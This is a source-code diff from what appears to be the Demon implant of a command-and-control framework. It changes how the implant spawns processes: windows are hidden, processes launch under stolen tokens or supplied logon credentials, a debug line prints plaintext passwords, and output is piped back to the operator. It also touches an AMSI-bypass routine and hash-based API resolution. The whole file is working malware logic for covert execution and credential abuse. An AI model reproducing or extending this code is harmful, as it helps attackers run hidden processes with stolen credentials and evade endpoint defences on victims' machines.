@@ -56,37 +56,11 @@ BOOL W32CreateClrInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, 
     return 1;
 }
 
-UINT_PTR HashStringEx( LPVOID String, UINT_PTR Length )
-{
-    ULONG	Hash = 5381;
-    PUCHAR	Ptr  = String;
-
-    do
-    {
-        UCHAR character = *Ptr;
-
-        if ( ! Length )
-        {
-            if ( !*Ptr ) break;
-        }
-        else
-        {
-            if ( (ULONG) ( Ptr - (PUCHAR)String ) >= Length ) break;
-            if ( !*Ptr ) ++Ptr;
-        }
-
-        if ( character >= 'a' )
-            character -= 0x20;
-
-        Hash = ( ( Hash << 5 ) + Hash ) + character;
-        ++Ptr;
-    } while ( TRUE );
-
-    return Hash;
-}
-
 UINT_PTR HashEx( LPVOID String, UINT_PTR Length, BOOL Upper )
 {
+    if ( ! String )
+        return 0;
+
     ULONG	Hash = 5381;
     PUCHAR	Ptr  = String;
 
@@ -126,7 +100,7 @@ PVOID LdrModulePeb( DWORD hModuleHash )
 
     do
     {
-        ModuleHash = HashStringEx( pModule->FullDllName.Buffer, pModule->FullDllName.Length );
+        ModuleHash = HashEx( pModule->FullDllName.Buffer, pModule->FullDllName.Length, TRUE );
 
         if ( ModuleHash == hModuleHash )
             return pModule->Reserved2[ 0 ];
@@ -212,7 +186,7 @@ PVOID LdrFunctionAddr( HMODULE Module, DWORD FunctionHash )
         }
     }
 
-    PUTS( "API not found" )
+    PRINTF( "API not found: FunctionHash:[%lx]\n", FunctionHash )
 
     return NULL;
 }
@@ -303,15 +277,16 @@ BOOL ProcessIsWow( HANDLE hProcess )
 BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PROCESS_INFORMATION* ProcessInfo, BOOL Piped, PANONPIPE DataAnonPipes )
 {
     PPACKAGE        Package         = NULL;
-    ANONPIPE        AnonPipe        = { 0 };
+    PANONPIPE       AnonPipe        = { 0 };
     STARTUPINFOA    StartUpInfo     = { 0 };
     LPWSTR          CommandLineW    = NULL;
     DWORD           CommandLineSize = StringLengthA( CmdLine );
     PVOID           Wow64Value      = NULL;
     BOOL            Return          = TRUE;
 
-    StartUpInfo.cb      = sizeof( STARTUPINFOA );
-    StartUpInfo.dwFlags = STARTF_USESTDHANDLES;
+    StartUpInfo.cb          = sizeof( STARTUPINFOA );
+    StartUpInfo.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    StartUpInfo.wShowWindow = SW_HIDE;
 
     Package = PackageCreate( DEMON_INFO );
     PackageAddInt32( Package, DEMON_INFO_PROC_CREATE );
@@ -319,32 +294,21 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
     if ( Piped )
     {
         PUTS( "Piped enabled" )
-        SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
+        AnonPipe = Instance->Win32.LocalAlloc( LPTR, sizeof( ANONPIPE ) );
+        MemSet( AnonPipe, 0, sizeof( ANONPIPE ) );
+        AnonPipesInit( AnonPipe );
 
-        if ( ! Instance->Win32.CreatePipe( &AnonPipe.StdInRead, &AnonPipe.StdInWrite, &SecurityAttr, 0 ) )
-        {
-            PRINTF( "CreatePipe StdIn Failed: %d\n", NtCurrentProcess() )
-            Return = FALSE;
-            goto Cleanup;
-        }
-
-        if ( ! Instance->Win32.CreatePipe( &AnonPipe.StdOutRead, &AnonPipe.StdOutWrite, &SecurityAttr, 0 ) )
-        {
-            PRINTF( "CreatePipe StdOut Failed: %d\n", NtCurrentProcess() )
-            Return = FALSE;
-            goto Cleanup;
-        }
-
-        StartUpInfo.hStdError  = AnonPipe.StdOutWrite;
-        StartUpInfo.hStdOutput = AnonPipe.StdOutWrite;
-        StartUpInfo.hStdInput  = AnonPipe.StdInRead;
+        StartUpInfo.hStdError  = AnonPipe->StdOutWrite;
+        StartUpInfo.hStdOutput = AnonPipe->StdOutWrite;
+        StartUpInfo.hStdInput  = NULL;
     }
-    else if ( DataAnonPipes )
+
+    if ( DataAnonPipes )
     {
         PUTS( "Using specified anon pipes" )
         StartUpInfo.hStdError  = DataAnonPipes->StdOutWrite;
         StartUpInfo.hStdOutput = DataAnonPipes->StdOutWrite;
-        StartUpInfo.hStdInput  = DataAnonPipes->StdInRead;
+        StartUpInfo.hStdInput  = NULL;
     }
 
     if ( EnableWow64 )
@@ -374,6 +338,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
 
         if ( Instance->Tokens.Token->Type == TOKEN_TYPE_STOLEN )
         {
+            PUTS( "CreateProcessWithTokenW" )
             if ( ! Instance->Win32.CreateProcessWithTokenW(
                     Instance->Tokens.Token->Handle,
                     LOGON_NETCREDENTIALS_ONLY,
@@ -395,7 +360,9 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         }
         else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
         {
-            if ( ! Instance->Win32.CreateProcessAsUserA(
+            PUTS( "CreateProcessWithLogonW" )
+            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance->Tokens.Token->lpUser, Instance->Tokens.Token->lpDomain, Instance->Tokens.Token->lpPassword )
+            if ( ! Instance->Win32.CreateProcessWithLogonW(
                         Instance->Tokens.Token->lpUser,
                         Instance->Tokens.Token->lpDomain,
                         Instance->Tokens.Token->lpPassword,
@@ -410,7 +377,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
                     )
                 )
             {
-                PRINTF( "CreateProcessAsUserA: Failed [%d]\n", NtGetLastError() );
+                PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 Return = FALSE;
                 goto Cleanup;
@@ -419,6 +386,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
 
         MemSet( CommandLineW, 0, CommandLineSize * 2 );
         Instance->Win32.LocalFree( CommandLineW );
+        CommandLineW = NULL;
     }
     else
     {
@@ -495,27 +463,28 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
     if ( Piped )
     {
         PUTS( "Piped enabled" )
+        Instance->Win32.NtClose( AnonPipe->StdOutWrite );
+        AnonPipe->StdOutWrite = NULL;
 
-        Instance->Win32.NtClose( AnonPipe.StdOutWrite );
-        Instance->Win32.NtClose( AnonPipe.StdInRead );
-
-        AnonPipesRead( &AnonPipe );
-
-        Instance->Win32.NtClose( AnonPipe.StdOutRead );
-        Instance->Win32.NtClose( AnonPipe.StdInWrite );
+        JobAdd( ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
     }
 
 Cleanup:
     PUTS( "Process cleanup" )
     if ( CommandLineW )
     {
+        PUTS( "1" )
         MemSet( CommandLineW, 0, CommandLineSize * 2 );
         Instance->Win32.LocalFree( CommandLineW );
     }
 
+    PUTS( "2" )
     PackageDestroy( Package );
+
+    PUTS( "3" )
     AnonPipesClose( &AnonPipe );
 
+    PUTS( "4" )
     return Return;
 }
 
@@ -565,7 +534,6 @@ BOOL BypassPatchAMSI()
             return TRUE;
 
         PUTS( "[-] Failed to change back protection" )
-
     }
 
     return FALSE;
@@ -574,9 +542,6 @@ BOOL BypassPatchAMSI()
 BOOL AnonPipesInit( PANONPIPE AnonPipes )
 {
     SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
-
-    if ( ! Instance->Win32.CreatePipe( &AnonPipes->StdInRead, &AnonPipes->StdInWrite, &SecurityAttr, 0 ) )
-        goto HandleError;
 
     if ( ! Instance->Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) )
         goto HandleError;
@@ -626,21 +591,7 @@ VOID AnonPipesRead( PANONPIPE AnonPipes )
     PackageAddBytes( Package, Buffer, dwBufferSize );
     PackageTransmit( Package, NULL, NULL );
 
-    MemSet( Buffer, 0, dwBufferSize );
-    Instance->Win32.LocalFree( Buffer );
-    Buffer = NULL;
-
-    if ( AnonPipes->StdOutRead )
-    {
-        Instance->Win32.NtClose( AnonPipes->StdOutRead );
-        AnonPipes->StdOutRead = NULL;
-    }
-
-    if ( AnonPipes->StdInWrite )
-    {
-        Instance->Win32.NtClose( AnonPipes->StdInWrite );
-        AnonPipes->StdInWrite = NULL;
-    }
+    DATA_FREE( Buffer, dwBufferSize );
 }
 
 VOID AnonPipesClose( PANONPIPE AnonPipes )
@@ -651,92 +602,10 @@ VOID AnonPipesClose( PANONPIPE AnonPipes )
         AnonPipes->StdOutRead = NULL;
     }
 
-    if ( AnonPipes->StdInWrite )
+    if ( AnonPipes->StdOutWrite )
     {
-        Instance->Win32.NtClose( AnonPipes->StdInWrite );
-        AnonPipes->StdInWrite = NULL;
-    }
-
-    if ( AnonPipes->StdInRead )
-    {
-        Instance->Win32.NtClose( AnonPipes->StdInRead );
-        AnonPipes->StdInRead = NULL;
-    }
-
-    if ( AnonPipes->StdInWrite )
-    {
-        Instance->Win32.NtClose( AnonPipes->StdInWrite );
-        AnonPipes->StdInWrite = NULL;
-    }
-}
-
-PNT_TIB W32GetTibFromThread( HANDLE hThread )
-{
-    THREAD_BASIC_INFORMATION ThreadBasicInfo = { 0 };
-    PNT_TIB                  ThreadIB        = NULL;
-    NTSTATUS                 NtStatus        = STATUS_SUCCESS;
-
-    ThreadIB = Instance->Win32.LocalAlloc( LPTR, sizeof( NT_TIB ) );
-    MemSet( ThreadIB, 0, sizeof( NT_TIB ) );
-
-    NtStatus = Instance->Syscall.NtQueryInformationThread( hThread, ThreadBasicInformation, &ThreadBasicInfo, sizeof( ThreadBasicInfo ), NULL );
-    if ( NT_SUCCESS( NtStatus ) )
-    {
-        Instance->Syscall.NtReadVirtualMemory( NtCurrentProcess(), ThreadBasicInfo.TebBaseAddress, ThreadIB, sizeof( NT_TIB ), NULL );
-        return ThreadIB;
-    }
-}
-
-HANDLE W32GetRandomThread()
-{
-    HANDLE  hThread     = NULL;
-    ULONG   BufferSize  = 0;
-    PVOID   Buffer      = NULL;
-    NTSTATUS NtStatus   = NULL;
-
-    OBJECT_ATTRIBUTES             ObjAttr  = { sizeof( OBJECT_ATTRIBUTES ) };
-    D_PSYSTEM_PROCESS_INFORMATION SysInfo  = { 0 };
-
-    NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, Buffer, BufferSize, &BufferSize );
-    if ( NtStatus == STATUS_INFO_LENGTH_MISMATCH )
-    {
-        Buffer = Instance->Win32.LocalAlloc( LPTR, BufferSize );
-
-        if ( ! NT_SUCCESS( ( NtStatus = Instance->Syscall.NtQuerySystemInformation( SystemProcessInformation, Buffer, BufferSize, &BufferSize ) ) ) )
-        {
-            PRINTF( "Error %d calling NtQuerySystemInformation.\n", Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-            return NULL;
-        }
-
-        unsigned int i = 0;
-
-        do {
-            SysInfo = &Buffer[ i ];
-
-            if ( SysInfo->ProcessId == Instance->Session.PID )
-            {
-                for ( UINT32 j = 0; j < SysInfo->ThreadCount; j++)
-                {
-                    if ( Instance->ThreadEnvBlock->ClientId.UniqueThread == SysInfo->ThreadInfos[ j ].ClientId.UniqueThread )
-                    {
-                        PRINTF( "Thread %d:\t%d ", j, SysInfo->ThreadInfos[ j ].ClientId.UniqueThread );
-                        if ( NT_SUCCESS( ( NtStatus = Instance->Syscall.NtOpenThread( &hThread, THREAD_ALL_ACCESS, &ObjAttr, &SysInfo->ThreadInfos[ j ].ClientId ) ) ) )
-                            return hThread;
-                        else
-                            PRINTF( "NtOpenThread: Failed: [%d]\n", Instance->Win32.RtlNtStatusToDosError( NtStatus ) )
-
-                        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-                        CALLBACK_GETLASTERROR
-                    }
-                }
-            }
-
-            i += SysInfo->NextOffset;
-
-        } while ( SysInfo->NextOffset != 0 );
-
-        // free memory
-        Instance->Win32.LocalFree( Buffer );
+        Instance->Win32.NtClose( AnonPipes->StdOutWrite );
+        AnonPipes->StdOutWrite = NULL;
     }
 }
 
